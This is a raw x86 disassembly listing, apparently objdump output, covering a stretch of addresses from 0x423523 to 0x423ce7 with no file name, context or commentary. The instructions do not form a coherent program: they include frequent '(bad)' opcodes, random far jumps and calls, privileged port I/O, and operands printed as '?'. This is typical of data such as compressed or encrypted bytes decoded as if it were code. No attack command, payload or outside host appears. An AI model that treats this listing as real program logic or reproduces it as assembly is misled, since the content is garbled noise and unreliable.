  423523:	xchg   DWORD PTR [edx+eiz*1+0x3c],ecx
  423527:	or     al,0x34
  423529:	xor    DWORD PTR [eax+0x47],0x4f6bf4ea
  423530:	and    ch,ch
  423532:	dec    DWORD PTR [esi-0xd]
  423535:	dec    esi
  423536:	addr16 popa 
  423538:	jmp    0x6dac30e
  42353d:	in     eax,0xfa
  42353f:	sub    ebx,DWORD PTR [ebx]
  423541:	cdq    
  423542:	arpl   WORD PTR [ebp+ebp*4-0x7e],cx
  423546:	ret    
  423547:	dec    edi
  423548:	adc    ebx,ecx
  42354a:	jp     0x423552
  42354c:	mov    esp,0x8e8c21c
  423551:	out    dx,al
  423552:	(bad)
  423555:	sbb    DWORD PTR ds:0xd4eebf3d,ebp
  42355b:	lods   al,BYTE PTR ds:[esi]
  42355c:	lock clc 
  42355e:	ins    BYTE PTR es:[edi],dx
  42355f:	outs   dx,DWORD PTR ds:[esi]
  423560:	mov    ebx,0x16074296
  423565:	shr    BYTE PTR [ecx-0x20],cl
  423568:	mov    esp,DWORD PTR [ebx-0x2f]
  42356b:	inc    esp
  42356c:	(bad)  
  42356d:	mov    al,ds:0x9772bdb9
  423572:	fild   WORD PTR [ebp-0x4a3384b6]
  423578:	test   BYTE PTR [ebx],dh
  42357a:	je     0x42355a
  42357c:	lock nop
  42357e:	pop    esp
  42357f:	gs gs and al,dh
  423583:	enter  0x6146,0x40
  423587:	xor    esp,eax
  423589:	push   edx
  42358a:	aad    0xce
  42358c:	adc    eax,0x5db0936
  423591:	mov    ds:0x3a10927d,al
  423596:	add    bl,ch
  423598:	xchg   esp,eax
  423599:	jg     0x4235b3
  42359b:	and    dl,ch
  42359d:	lahf   
  42359e:	pop    esi
  42359f:	and    al,0xff
  4235a1:	jns    0x4235bb
  4235a3:	xchg   esp,eax
  4235a4:	dec    edi
  4235a5:	xchg   ecx,eax
  4235a6:	jnp    0x423596
  4235a8:	or     BYTE PTR [eax+edx*1],dh
  4235ab:	cwde   
  4235ac:	pop    ebx
  4235ad:	pop    ds
  4235ae:	rol    BYTE PTR ds:0x9d24174c,cl
  4235b4:	xchg   ebx,eax
  4235b5:	(bad)  
  4235b6:	jne    0x423561
  4235b8:	adc    al,0x44
  4235ba:	(bad)  
  4235bc:	push   ebp
  4235bd:	lds    edx,FWORD PTR [ecx+0xa180965]
  4235c3:	dec    edx
  4235c4:	stos   BYTE PTR es:[edi],al
  4235c5:	mov    al,0x8e
  4235c7:	test   DWORD PTR ds:0x6c4be787,esp
  4235cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235ce:	xchg   esi,eax
  4235d0:	jae    0x423648
  4235d2:	les    edi,FWORD PTR [eax]
  4235d4:	xor    DWORD PTR [ecx+0x57],ecx
  4235d7:	(bad)  
  4235d8:	sahf   
  4235d9:	aad    0xa6
  4235db:	or     al,0xe3
  4235dd:	inc    ebp
  4235de:	pop    ebp
  4235df:	mov    ds:0xb0039f30,eax
  4235e4:	fs popf 
  4235e6:	retf   
  4235e7:	mov    ah,0x68
  4235e9:	sub    al,0x7e
  4235eb:	and    DWORD PTR [eax+0xa7c4718],ecx
  4235f1:	lahf   
  4235f2:	fwait
  4235f3:	or     eax,0x6db7c62c
  4235f8:	adc    eax,0x25f1bed6
  4235fd:	push   edi
  4235fe:	aam    0xf8
  423600:	mov    ecx,0x17ec96ff
  423605:	into   
  423606:	enter  0x7ebf,0x5e
  42360a:	dec    ebp
  42360b:	and    DWORD PTR [esi],edi
  42360d:	imul   edx,ecx,0xffffffd4
  423610:	scas   al,BYTE PTR es:[edi]
  423611:	fldlg2 
  423613:	xchg   DWORD PTR [ecx],ecx
  423615:	rcl    DWORD PTR [ecx],1
  423617:	pop    es
  423618:	xchg   BYTE PTR [edx],ch
  42361a:	mul    BYTE PTR [esi+0x1c]
  42361d:	add    BYTE PTR [esi],al
  42361f:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423621:	cld    
  423622:	xchg   edi,eax
  423623:	mov    eax,ds:0x9346ee2c
  423628:	adc    BYTE PTR [ebp+0x23],ch
  42362b:	shl    BYTE PTR [edx],1
  42362d:	lock inc ecx
  42362f:	imul   esp,DWORD PTR [ecx+0x18],0xffffffb7
  423633:	retf   0xccb2
  423636:	jno    0x423658
  423638:	xchg   esi,eax
  423639:	leave  
  42363a:	scas   eax,DWORD PTR es:[edi]
  42363b:	xchg   BYTE PTR [ebx-0x23],al
  42363e:	sub    eax,0xb48dd12
  423643:	ja     0x4235d2
  423645:	sti    
  423646:	dec    ecx
  423647:	pop    ebx
  423649:	mov    bl,BYTE PTR [ecx]
  42364b:	cmp    al,0x61
  42364d:	mov    WORD PTR [eax+0x8a0868],ds
  423653:	cmp    edi,DWORD PTR [eax]
  423655:	fistp  WORD PTR [ebp-0x21497862]
  42365b:	mov    bl,BYTE PTR [esi+0x7f3ccc05]
  423661:	dec    ecx
  423662:	mov    ds:0xb2b4cd23,al
  423667:	xor    DWORD PTR [esi-0x4bc4c083],ebx
  42366d:	cmp    esp,edx
  42366f:	aaa    
  423670:	dec    esp
  423671:	pop    eax
  423672:	(bad)  
  423673:	nop
  423674:	ret    
  423675:	fs push es
  423677:	xor    al,0x6
  423679:	(bad)  
  42367a:	push   cs
  42367b:	jl     0x4236bf
  42367d:	or     eax,0xeefdf40f
  423682:	xchg   ebx,eax
  423683:	hlt    
  423684:	jge    0x42367c
  423686:	inc    ebx
  423687:	sub    bl,dl
  423689:	es inc esp
  42368b:	mov    ebx,0x42976173
  423690:	mov    dl,0xb
  423692:	inc    ecx
  423693:	mov    WORD PTR [eax+0x571d9ba0],cs
  423699:	mov    DWORD PTR ss:[ebx+0x35],ecx
  42369d:	call   0xe305b165
  4236a2:	ja     0x423715
  4236a4:	inc    ecx
  4236a5:	rcr    DWORD PTR [esi-0x3976141a],cl
  4236ab:	push   0x9c572490
  4236b0:	(bad)  
  4236b1:	popa   
  4236b2:	adc    BYTE PTR [esi-0x56c8e6fd],dh
  4236b8:	lods   al,BYTE PTR ds:[esi]
  4236b9:	sub    BYTE PTR [ebx],ah
  4236bb:	mov    ebp,?
  4236bd:	sub    ah,0xc9
  4236c0:	dec    eax
  4236c1:	mov    eax,ds:0xebeed004
  4236c6:	dec    edi
  4236c7:	outs   dx,DWORD PTR ds:[esi]
  4236c8:	fadd   st,st(2)
  4236ca:	jp     0x42368c
  4236cc:	pop    edx
  4236cd:	sahf   
  4236ce:	sar    BYTE PTR [eax+0x1a],cl
  4236d1:	pop    esp
  4236d2:	popf   
  4236d3:	jl     0x42368a
  4236d5:	mov    al,ds:0x5c7ac57c
  4236da:	icebp  
  4236db:	loop   0x42368b
  4236dd:	sar    DWORD PTR [ecx],cl
  4236df:	adc    al,BYTE PTR [esi-0x57c0aba]
  4236e5:	add    DWORD PTR [edx-0x3670347a],edx
  4236eb:	lahf   
  4236ec:	xlat   BYTE PTR ds:[ebx]
  4236ed:	jmp    0xe032055a
  4236f2:	inc    ebp
  4236f3:	je     0x4236a4
  4236f5:	xlat   BYTE PTR ds:[ebx]
  4236f6:	fst    DWORD PTR [esi-0x61]
  4236f9:	or     BYTE PTR [esi+0x25751ef0],dh
  4236ff:	push   esp
  423700:	fidiv  DWORD PTR [ecx]
  423702:	outs   dx,DWORD PTR cs:[esi]
  423704:	sbb    dh,0x96
  423707:	push   ebp
  423708:	out    0x54,eax
  42370a:	xor    al,0xf5
  42370c:	push   ecx
  42370d:	iret   
  42370e:	and    BYTE PTR [ebp-0x4fef6dc8],ah
  423714:	ds test eax,0xafe4cdf1
  42371a:	(bad)  
  42371b:	retf   0xf70
  42371e:	arpl   bp,si
  423720:	pop    ebx
  423721:	test   al,0x25
  423723:	mov    esp,0x5b79cefb
  423728:	pop    esi
  423729:	pop    es
  42372a:	sbb    DWORD PTR [ebx-0x42],ebx
  42372d:	add    bl,BYTE PTR [ecx+edi*2]
  423730:	mov    ah,0xdb
  423732:	sti    
  423733:	mov    ds:0x7c35ab02,eax
  423738:	add    al,al
  42373a:	dec    ebp
  42373b:	mov    bl,0x29
  42373d:	xchg   esp,eax
  42373e:	je     0x423791
  423740:	jge    0x4237b1
  423742:	ins    DWORD PTR es:[edi],dx
  423743:	outs   dx,BYTE PTR ds:[esi]
  423744:	push   ebx
  423745:	adc    DWORD PTR [ebp-0x14b5ae0f],ebx
  42374b:	mov    cl,0x15
  42374d:	jmp    0x42373e
  42374f:	enter  0xb7ae,0x9b
  423753:	test   ebp,0x867cde3d
  423759:	cld    
  42375a:	mov    al,0x96
  42375c:	sbb    eax,0xe52118e9
  423761:	xchg   ebx,esi
  423763:	call   0xbdc6c834
  423768:	xor    al,0x11
  42376a:	outs   dx,BYTE PTR ds:[esi]
  42376b:	push   edx
  42376c:	ds lahf 
  42376e:	mov    al,ds:0xaaeebefc
  423773:	xor    al,0x6f
  423775:	test   eax,0x72cc74a6
  42377a:	aas    
  42377b:	ret    0x41b4
  42377e:	std    
  42377f:	popf   
  423780:	fsubr  st,st(7)
  423782:	jle    0x42371a
  423784:	test   al,0x63
  423786:	pusha  
  423787:	inc    ebp
  423788:	pop    ebp
  423789:	pop    es
  42378a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42378b:	out    dx,eax
  42378c:	arpl   WORD PTR [ebx+0x66d84d2e],ax
  423792:	or     al,0x84
  423794:	aaa    
  423795:	(bad)
  423799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42379a:	sub    al,0x96
  42379c:	push   0x263f20d8
  4237a1:	jae    0x42377b
  4237a3:	cmc    
  4237a4:	into   
  4237a5:	in     al,dx
  4237a6:	rol    BYTE PTR [ebx],0xc5
  4237a9:	xchg   esi,eax
  4237aa:	pop    ebp
  4237ab:	jbe    0x423738
  4237ad:	sub    DWORD PTR [esi-0x43ed309b],edi
  4237b3:	mov    ch,0xfd
  4237b5:	loopne 0x4237e7
  4237b7:	add    eax,0x50003f13
  4237bc:	jae    0x4237c0
  4237be:	adc    ebx,DWORD PTR [edx+eiz*1-0x16]
  4237c2:	fistp  WORD PTR [ecx-0x6b1cc4a4]
  4237c8:	jb     0x423830
  4237ca:	loope  0x423826
  4237cc:	push   es
  4237cd:	repz jo 0x4237eb
  4237d0:	cdq    
  4237d1:	call   0x5666:0xbbbdc28c
  4237d8:	addr16 xchg esp,eax
  4237da:	xchg   esi,eax
  4237db:	inc    esp
  4237dc:	xor    edi,DWORD PTR [edx-0x2a]
  4237df:	add    bh,ah
  4237e1:	loope  0x423857
  4237e3:	shr    BYTE PTR [ecx+0x2228cc5c],0xc0
  4237ea:	push   edi
  4237eb:	xchg   DWORD PTR [edx+0x19],esp
  4237ee:	dec    esi
  4237ef:	nop
  4237f0:	mov    eax,ds:0x50dbd4f1
  4237f5:	scas   al,BYTE PTR es:[edi]
  4237f6:	xlat   BYTE PTR ds:[ebx]
  4237f7:	cmp    bl,BYTE PTR ds:0x5d2df009
  4237fd:	ins    BYTE PTR es:[edi],dx
  4237fe:	fst    DWORD PTR [esi+0x2e5a33e1]
  423804:	mov    edi,0x6bdc7973
  423809:	lock mov dl,0x3f
  42380c:	inc    edi
  42380d:	in     eax,0x11
  42380f:	mov    bh,0x93
  423811:	inc    ebx
  423812:	mov    ds:0xab2a0332,eax
  423817:	mov    ecx,0x6fe7e0fa
  42381c:	arpl   WORD PTR [edx],cx
  42381e:	cmp    dl,bl
  423820:	push   0x2
  423822:	mov    edx,DWORD PTR [edx+0x5eff640]
  423828:	fisubr WORD PTR [ebp+0x67]
  42382b:	or     cl,BYTE PTR [edx+0x2f]
  42382e:	dec    ebp
  42382f:	xchg   BYTE PTR [edx+0x12],bh
  423832:	shl    BYTE PTR [eax-0x5b974b2c],0x1e
  423839:	adc    ecx,DWORD PTR [ebx-0x781c0f51]
  42383f:	pop    esp
  423840:	sar    ecx,0x43
  423843:	stos   BYTE PTR es:[edi],al
  423844:	icebp  
  423845:	jecxz  0x423802
  423847:	nop
  423848:	sub    DWORD PTR ds:0x4036a7b8,ebx
  42384e:	pop    ds
  42384f:	pop    ss
  423850:	xlat   BYTE PTR ds:[ebx]
  423851:	sbb    al,0xee
  423853:	jge    0x423869
  423855:	jecxz  0x4238b7
  423857:	call   0xbfe52374
  42385c:	rol    DWORD PTR [edi+esi*4+0x69abaffd],cl
  423863:	shl    DWORD PTR [eax],cl
  423865:	push   ecx
  423866:	dec    edx
  423867:	push   ebx
  423868:	sbb    BYTE PTR cs:[edx+edi*4-0x79],cl
  42386d:	das    
  42386e:	imul   DWORD PTR [ebx+0x2e17d3b0]
  423874:	daa    
  423875:	daa    
  423876:	push   eax
  423877:	cdq    
  423878:	or     DWORD PTR [eax],edx
  42387a:	sar    BYTE PTR [edi],1
  42387c:	xor    al,0xf2
  42387e:	loope  0x423862
  423880:	mov    dl,0x8d
  423882:	xchg   edx,eax
  423883:	outs   dx,DWORD PTR ds:[esi]
  423884:	gs cli 
  423886:	test   al,0x8d
  423888:	icebp  
  423889:	fld    DWORD PTR ds:0x20bda5cb
  42388f:	mov    esp,0x859ac520
  423894:	sahf   
  423895:	js     0x42387e
  423897:	rol    DWORD PTR [edx+0x20],0x8a
  42389b:	jmp    0x4238b6
  42389d:	cmc    
  42389e:	test   eax,0x1fca36a1
  4238a3:	cmp    eax,0x78fbffa8
  4238a8:	jge    0x4238ea
  4238aa:	push   ebp
  4238ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ac:	int3   
  4238ad:	mov    esi,0xe6e6279b
  4238b2:	fwait
  4238b3:	popa   
  4238b4:	xor    DWORD PTR [ebx],esp
  4238b6:	into   
  4238b7:	cmp    DWORD PTR [eax],esi
  4238b9:	gs xchg ebp,eax
  4238bb:	xchg   ebx,eax
  4238bc:	fidivr WORD PTR [edx]
  4238be:	fldcw  WORD PTR [eax-0x231285e2]
  4238c4:	jp     0x4238f9
  4238c6:	or     eax,0xbdfa1aa4
  4238cb:	mov    esi,0x906d67a5
  4238d1:	xchg   ebx,eax
  4238d2:	pop    ecx
  4238d3:	out    dx,al
  4238d4:	mov    BYTE PTR [edx-0xf],bh
  4238d7:	adc    al,0x79
  4238d9:	pop    esi
  4238da:	jp     0x423949
  4238dc:	int    0xa1
  4238de:	dec    esp
  4238df:	jb     0x4238d9
  4238e1:	pop    ebp
  4238e2:	mov    ecx,0x2b0a59c6
  4238e7:	sub    eax,0x48d681d
  4238ec:	(bad)  [esi]
  4238ee:	cmc    
  4238ef:	xchg   esi,eax
  4238f0:	leave  
  4238f1:	aas    
  4238f2:	ss xchg ecx,eax
  4238f4:	push   eax
  4238f5:	arpl   WORD PTR [eax+ebp*2-0x1980b7f2],si
  4238fc:	mov    ch,0x52
  4238fe:	push   edi
  4238ff:	or     bl,BYTE PTR [esi]
  423901:	inc    esi
  423902:	pop    ds
  423903:	(bad)  
  423904:	sar    DWORD PTR [edi-0x7cc30645],1
  42390a:	sbb    esp,DWORD PTR [ecx+0x56]
  42390d:	sub    bl,bh
  42390f:	ins    DWORD PTR es:[edi],dx
  423910:	fadd   DWORD PTR [edi]
  423912:	ret    
  423913:	imul   eax,DWORD PTR [edi],0xffffffee
  423916:	leave  
  423917:	mov    ebx,0xb429b8e1
  42391c:	fbld   TBYTE PTR [esi]
  42391e:	mov    cl,ch
  423920:	push   0x4804ca31
  423925:	sub    eax,0x411fd08f
  42392a:	fcomi  st,st(4)
  42392c:	dec    esp
  42392d:	aas    
  42392e:	cs cld 
  423930:	mov    esp,0x87745c89
  423935:	dec    eax
  423936:	or     DWORD PTR [ebp+0x616e7b9],0x3c767cfe
  423940:	std    
  423941:	retf   
  423942:	fmul   DWORD PTR [esi]
  423944:	outs   dx,DWORD PTR ds:[esi]
  423945:	and    esp,ebp
  423947:	js     0x423982
  423949:	push   ss
  42394a:	popf   
  42394b:	adc    ah,BYTE PTR [esi]
  42394d:	adc    DWORD PTR [ecx-0x59],0xd6c2ca3e
  423954:	adc    al,0xca
  423956:	push   ss
  423957:	xchg   ebp,eax
  423958:	call   0x5a17:0xa568cdb
  42395f:	cld    
  423960:	(bad)  
  423962:	ds into 
  423964:	jmp    0x1b3f:0x1e3cc337
  42396b:	push   edx
  42396c:	mov    eax,ds:0xdd93bd0a
  423971:	push   ds
  423972:	mov    esp,0x164a7123
  423977:	push   ss
  423978:	xchg   bl,cl
  42397a:	je     0x4239d4
  42397c:	push   esi
  42397d:	(bad)  
  42397f:	in     al,0xd5
  423981:	mov    dl,0x73
  423983:	mov    WORD PTR [esi+0x7],?
  423986:	mov    edx,0x66557188
  42398b:	aaa    
  42398c:	inc    esp
  42398d:	je     0x4239bd
  42398f:	daa    
  423990:	xchg   edx,eax
  423991:	jp     0x4239dd
  423993:	ss jo  0x42393c
  423996:	sbb    al,0xfe
  423998:	adc    DWORD PTR [edi-0x70],0x73
  42399c:	push   eax
  42399d:	sbb    al,0x45
  42399f:	fstp   QWORD PTR [ebp+0x2cc6cae0]
  4239a5:	add    DWORD PTR [ebx-0x79],edi
  4239a8:	in     al,dx
  4239a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239aa:	jmp    0x423964
  4239ac:	inc    ecx
  4239ad:	and    DWORD PTR [edx-0x75],edx
  4239b0:	pop    es
  4239b1:	or     al,0x3f
  4239b3:	aad    0x86
  4239b5:	pop    edx
  4239b6:	lods   al,BYTE PTR ds:[esi]
  4239b7:	xchg   ecx,eax
  4239b8:	push   ebx
  4239b9:	int    0x93
  4239bb:	mov    ds:0xa9927513,eax
  4239c0:	std    
  4239c1:	sub    al,0x4
  4239c3:	dec    ecx
  4239c4:	arpl   WORD PTR [ecx+esi*2+0x41],ax
  4239c8:	dec    ebp
  4239c9:	xchg   ebx,eax
  4239ca:	rcr    BYTE PTR [edi+ebx*8-0x5f],0x5d
  4239cf:	fmulp  st(6),st
  4239d1:	dec    ebp
  4239d2:	daa    
  4239d3:	mov    bh,BYTE PTR ds:0x5d3181d2
  4239d9:	and    cl,BYTE PTR [ebp-0x7351903c]
  4239df:	xchg   edx,eax
  4239e0:	xor    bl,ah
  4239e2:	outs   dx,DWORD PTR ds:[esi]
  4239e3:	jno    0x423a26
  4239e5:	sub    DWORD PTR [ebp-0xc],edi
  4239e8:	xor    DWORD PTR [edx-0x2148592f],ecx
  4239ee:	mov    cl,0xc0
  4239f0:	mov    bh,0xf0
  4239f2:	fdiv   DWORD PTR [esp+edi*2+0x0]
  4239f6:	xchg   DWORD PTR [eax+0x79b2fd55],ebp
  4239fc:	mov    eax,ds:0xb29f298
  423a01:	adc    eax,0xf8457d57
  423a06:	jecxz  0x423a0e
  423a08:	ja     0x423a29
  423a0a:	scas   eax,DWORD PTR es:[edi]
  423a0b:	test   DWORD PTR [ecx],edx
  423a0d:	repnz xor ebx,DWORD PTR [edx-0x4f]
  423a11:	sbb    BYTE PTR [edi-0x2a925674],dh
  423a17:	sbb    BYTE PTR [ecx-0x71],al
  423a1a:	push   cs
  423a1b:	ins    DWORD PTR es:[edi],dx
  423a1c:	addr16 int3 
  423a1e:	mov    ds:0x571a5a1a,al
  423a23:	ror    edi,cl
  423a25:	(bad)  
  423a26:	cld    
  423a27:	sbb    eax,esp
  423a29:	imul   ecx,edx,0xf99bb104
  423a2f:	add    BYTE PTR [edx+0x68],0xf1
  423a33:	loop   0x423a77
  423a35:	fild   WORD PTR [edx+0x3a]
  423a38:	adc    al,0x96
  423a3a:	stos   DWORD PTR es:[edi],eax
  423a3b:	inc    ebp
  423a3c:	imul   ebp,DWORD PTR [ebp+0x64],0x60a67bd4
  423a43:	mov    ah,0x34
  423a45:	or     al,0xe6
  423a47:	test   al,0x0
  423a49:	(bad)  
  423a4a:	je     0x423a43
  423a4c:	ja     0x4239d6
  423a4e:	fsubr  DWORD PTR [ecx+ebp*4+0x1938c732]
  423a55:	add    bl,0x30
  423a58:	outs   dx,DWORD PTR ds:[esi]
  423a59:	hlt    
  423a5a:	mov    esp,0x96391268
  423a5f:	xor    dl,BYTE PTR [ebx-0x12b094b]
  423a65:	test   DWORD PTR [edx-0x458ea0c3],ebp
  423a6b:	add    DWORD PTR [ebx+0x27],ecx
  423a6e:	jno    0x423aaf
  423a70:	mov    ebp,0xf20c498a
  423a75:	rcr    BYTE PTR [ebp-0x41],0xf0
  423a79:	inc    ebp
  423a7a:	mov    ds:0x3a7fbe4f,al
  423a7f:	std    
  423a80:	mov    cl,0x70
  423a82:	add    edi,DWORD PTR [eax]
  423a84:	ds jmp 0x645:0x9b223375
  423a8c:	cld    
  423a8d:	gs enter 0xdd62,0x89
  423a92:	pop    ss
  423a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a94:	xchg   BYTE PTR [ebp+0x4e3d5384],dl
  423a9a:	inc    ecx
  423a9b:	dec    esi
  423a9c:	add    dl,BYTE PTR ds:[ebx-0x27]
  423aa0:	lock jo 0x423b0d
  423aa3:	mov    ds:0x54b679a3,al
  423aa8:	popf   
  423aa9:	jle    0x423b0a
  423aab:	fisub  WORD PTR [eax+ecx*2+0x30]
  423aaf:	inc    ebx
  423ab0:	stos   BYTE PTR es:[edi],al
  423ab1:	sbb    eax,0x753931a8
  423ab6:	mov    ah,BYTE PTR [edi]
  423ab8:	mov    ch,BYTE PTR [esi-0x17]
  423abb:	(bad)  
  423abc:	ins    DWORD PTR es:[edi],dx
  423abd:	cld    
  423abe:	(bad)  
  423ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ac1:	dec    ebx
  423ac2:	push   esi
  423ac3:	fwait
  423ac4:	xor    dh,BYTE PTR [eax]
  423ac6:	xchg   ebx,ebp
  423ac8:	mov    ?,WORD PTR [edx+0xb5f5823]
  423ace:	dec    ebp
  423acf:	push   ebp
  423ad0:	pop    esi
  423ad1:	sub    eax,0xadf02787
  423ad6:	or     edx,DWORD PTR [edi-0x298a6f01]
  423adc:	sbb    eax,0x79ce62a0
  423ae1:	rol    BYTE PTR [esi],1
  423ae3:	pop    ss
  423ae4:	int3   
  423ae5:	(bad)  
  423ae7:	jne    0x423a83
  423ae9:	lds    edx,FWORD PTR [eax]
  423aeb:	cmp    BYTE PTR [ecx],bl
  423aed:	daa    
  423aee:	jp     0x423a70
  423af0:	sub    esp,DWORD PTR [esi-0x1799f9f0]
  423af6:	test   al,0x6b
  423af8:	or     cl,BYTE PTR [ebx+0x4c]
  423afb:	jbe    0x423b4a
  423afd:	nop
  423afe:	mov    bh,0x29
  423b00:	rcl    edi,1
  423b02:	jmp    0x807fc057
  423b07:	add    eax,0xcd7dcdfa
  423b0c:	xchg   DWORD PTR [edi-0x4a],ebx
  423b0f:	mov    ds:0xcbeb6f16,eax
  423b14:	sub    BYTE PTR [ecx*8+0x66057397],0xe4
  423b1c:	cmp    al,0x41
  423b1e:	test   eax,0xd8743398
  423b23:	dec    ebx
  423b24:	lods   eax,DWORD PTR ds:[esi]
  423b25:	das    
  423b26:	les    ebp,FWORD PTR [edi-0x24024e32]
  423b2c:	mov    cl,0xc6
  423b2e:	adc    bh,ch
  423b30:	jmp    0x423b4a
  423b32:	sub    BYTE PTR [ebp-0x2d],dh
  423b35:	push   ebp
  423b36:	in     eax,0x7a
  423b38:	ffreep st(4)
  423b3a:	jg     0x423af9
  423b3c:	in     eax,0x7a
  423b3e:	jmp    0xcf2e:0xc13139fd
  423b45:	ficomp WORD PTR [esp+0x7b]
  423b49:	or     BYTE PTR [edx-0x272702d4],ah
  423b4f:	cmp    ecx,edi
  423b51:	add    ch,ch
  423b53:	jmp    0xa311:0x52180414
  423b5a:	xchg   edx,eax
  423b5b:	lahf   
  423b5c:	push   esp
  423b5d:	cdq    
  423b5e:	inc    esp
  423b5f:	jmp    0x423b73
  423b61:	cmp    BYTE PTR [esp+edi*1+0x3127d4f7],ch
  423b68:	and    al,0x67
  423b6a:	adc    eax,DWORD PTR [eax-0x47]
  423b6d:	fdivp  st(3),st
  423b6f:	pushf  
  423b70:	int3   
  423b71:	cmp    al,0x17
  423b73:	xchg   ah,bh
  423b75:	dec    ecx
  423b76:	or     al,0xdf
  423b78:	ret    0x784b
  423b7b:	push   esi
  423b7c:	mov    ebx,0xea81a3be
  423b81:	jns    0x423b6f
  423b83:	xchg   esp,esi
  423b85:	jge    0x423bdb
  423b87:	cmp    esp,DWORD PTR [ecx+0x24aea2b4]
  423b8d:	dec    ecx
  423b8e:	test   eax,esi
  423b90:	jae    0x423b34
  423b92:	scas   al,BYTE PTR es:[edi]
  423b93:	shr    DWORD PTR [eax+esi*8-0x15602616],cl
  423b9a:	xchg   esi,eax
  423b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b9c:	ret    0xde2d
  423b9f:	iret   
  423ba0:	push   edi
  423ba1:	xor    eax,0x105ce59e
  423ba6:	call   0x57094bbc
  423bab:	aad    0x32
  423bad:	mov    BYTE PTR [ecx],al
  423baf:	js     0x423c15
  423bb1:	stos   DWORD PTR es:[edi],eax
  423bb2:	ss js  0x423b61
  423bb5:	xor    ecx,DWORD PTR [ebx*4-0x2f95db8e]
  423bbc:	and    eax,0x3c1b8638
  423bc1:	or     cl,BYTE PTR [ebp-0x5bb5eb11]
  423bc7:	add    al,0x90
  423bc9:	pushf  
  423bca:	(bad)  
  423bcb:	popf   
  423bcc:	mov    ebx,0x26d0e480
  423bd1:	or     al,dh
  423bd3:	(bad)  
  423bd4:	ficom  WORD PTR [esi]
  423bd6:	adc    eax,0x719059dd
  423bdb:	ins    DWORD PTR es:[edi],dx
  423bdc:	in     eax,0x5a
  423bde:	(bad)  
  423bdf:	jne    0x423b6b
  423be1:	call   0x8aaf:0xd8d6cedd
  423be8:	jecxz  0x423c62
  423bea:	cmp    dh,cl
  423bec:	shl    esi,1
  423bee:	mov    BYTE PTR [eax+edi*1+0x2ddfec69],cl
  423bf5:	(bad)  
  423bf7:	lea    esp,[eax+0x3b]
  423bfa:	pusha  
  423bfb:	retf   
  423bfc:	lods   al,BYTE PTR ds:[esi]
  423bfd:	jae    0x423b7f
  423bff:	cmp    BYTE PTR [ebp-0x3b],bl
  423c02:	push   DWORD PTR [ebp-0x1942a74e]
  423c08:	addr16 (bad) 
  423c0b:	stc    
  423c0c:	sub    al,0x1e
  423c0e:	inc    ecx
  423c0f:	or     al,0x61
  423c11:	jbe    0x423c76
  423c13:	or     al,BYTE PTR [edi+0x62b06ccf]
  423c19:	and    eax,0x96239746
  423c1e:	mov    dl,0xd1
  423c20:	lahf   
  423c21:	(bad)  
  423c22:	mov    cl,0x71
  423c24:	jle    0x423bbd
  423c26:	add    DWORD PTR [esi-0x7b],esi
  423c29:	jmp    0x423bc9
  423c2b:	test   eax,0x9196a867
  423c30:	xor    DWORD PTR [ebx],ecx
  423c32:	test   ebp,esi
  423c34:	xor    BYTE PTR [ecx+esi*8],bl
  423c37:	and    BYTE PTR [esi+eiz*8-0x7db3bf81],bl
  423c3e:	ins    DWORD PTR es:[edi],dx
  423c3f:	popf   
  423c40:	xchg   esi,eax
  423c41:	outs   dx,BYTE PTR ds:[esi]
  423c42:	mov    edx,0x8a9b5d2c
  423c47:	in     al,dx
  423c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c49:	mov    ah,0x52
  423c4b:	xchg   edx,esi
  423c4d:	hlt    
  423c4e:	js     0x423c5f
  423c50:	mov    dh,0xb2
  423c52:	mov    ebx,gs
  423c54:	sti    
  423c55:	call   0x206c:0xe28acc76
  423c5c:	push   eax
  423c5d:	ins    DWORD PTR es:[edi],dx
  423c5e:	dec    ebx
  423c5f:	in     eax,dx
  423c60:	aad    0xe8
  423c62:	sahf   
  423c63:	adc    eax,0x2f6175ea
  423c68:	jl     0x423c53
  423c6a:	sub    cl,BYTE PTR [edx]
  423c6c:	fsubr  QWORD PTR [edx]
  423c6e:	dec    esi
  423c6f:	dec    ebx
  423c70:	fiadd  DWORD PTR [edi-0x1f]
  423c73:	mov    bh,ch
  423c75:	into   
  423c76:	not    BYTE PTR [edi]
  423c78:	mov    ds:0x98f3c769,al
  423c7d:	sbb    BYTE PTR [edx-0x461ed78],0xdb
  423c84:	pop    ecx
  423c85:	inc    esp
  423c86:	hlt    
  423c87:	xor    bl,dl
  423c89:	nop
  423c8a:	sub    BYTE PTR [ecx+0x58d1cb08],cl
  423c90:	imul   eax,DWORD PTR [ebp+0x58],0x56e51475
  423c97:	daa    
  423c98:	mov    bh,0x62
  423c9a:	push   0xce4abfc6
  423c9f:	xor    cl,cl
  423ca1:	adc    ah,BYTE PTR [edx+edx*1+0x59]
  423ca5:	mov    dh,0xcf
  423ca7:	lahf   
  423ca8:	ret    
  423ca9:	mov    dl,0x67
  423cab:	add    esi,DWORD PTR [ebx]
  423cad:	inc    ecx
  423cae:	ficomp DWORD PTR [ebx-0x39776288]
  423cb4:	pop    es
  423cb5:	out    0x40,al
  423cb7:	jns    0x423d12
  423cb9:	push   ebp
  423cba:	and    al,0x32
  423cbc:	mov    dl,0x65
  423cbe:	and    al,0x1e
  423cc0:	jo     0x423cf2
  423cc2:	fst    QWORD PTR ds:0xd0e61bbe
  423cc8:	scas   eax,DWORD PTR es:[edi]
  423cc9:	lods   al,BYTE PTR ds:[esi]
  423cca:	into   
  423ccb:	cmp    al,0xf5
  423ccd:	aam    0xfa
  423ccf:	add    ecx,DWORD PTR [eax]
  423cd1:	mov    dh,0x30
  423cd3:	pop    ebp
  423cd4:	jb     0x423d45
  423cd6:	out    0xb3,eax
  423cd8:	test   BYTE PTR [ebx+0xc],dh
  423cdb:	imul   cl
  423cdd:	xchg   esi,eax
  423cde:	pop    edi
  423cdf:	das    
  423ce0:	sahf   
  423ce1:	retf   
  423ce2:	div    BYTE PTR [ecx]
  423ce4:	not    DWORD PTR [edi+0x51]
  423ce7:	mov    dh,0x31
